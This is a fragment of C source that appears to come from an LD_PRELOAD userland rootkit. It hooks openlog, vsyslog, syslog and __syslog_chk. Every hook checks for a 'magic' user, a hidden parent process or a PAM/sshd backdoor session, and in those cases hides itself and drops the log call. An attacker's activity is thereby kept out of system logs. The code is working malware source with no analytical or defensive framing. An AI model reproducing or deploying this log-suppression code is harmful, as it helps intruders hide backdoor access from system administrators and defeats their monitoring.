void openlog(const char *ident, int option, int facility){
    if(magicusr() || hidden_ppid()
        #ifdef USE_PAM_BD
         || magicsshd()
        #endif
        ){
        hide_self();
        return;
    }
    hook(COPENLOG);
    call(COPENLOG, ident, option, facility);
}
void vsyslog(int priority, const char *format, va_list ap){
    if(magicusr() || hidden_ppid()
        #ifdef USE_PAM_BD
         || magicsshd()
        #endif
        ){
        hide_self();
        return;
    }
    hook(CVSYSLOG);
    call(CVSYSLOG, priority, format, ap);
}
void syslog(int priority, const char *format, ...){
    if(magicusr() || hidden_ppid()
        #ifdef USE_PAM_BD
         || magicsshd()
        #endif
        ){
        hide_self();
        return;
    }
    va_list va;
    va_start(va, format);
    vsyslog(priority, format, va);
    va_end(va);
}
void __syslog_chk(int priority, int flag, const char *format, ...){
    if(magicusr() || hidden_ppid()
        #ifdef USE_PAM_BD
         || magicsshd()
        #endif
        ){
        hide_self();
        return;
    }
    va_list va;
    va_start(va,format);
    vsyslog(priority,format,va);
    va_end(va);
}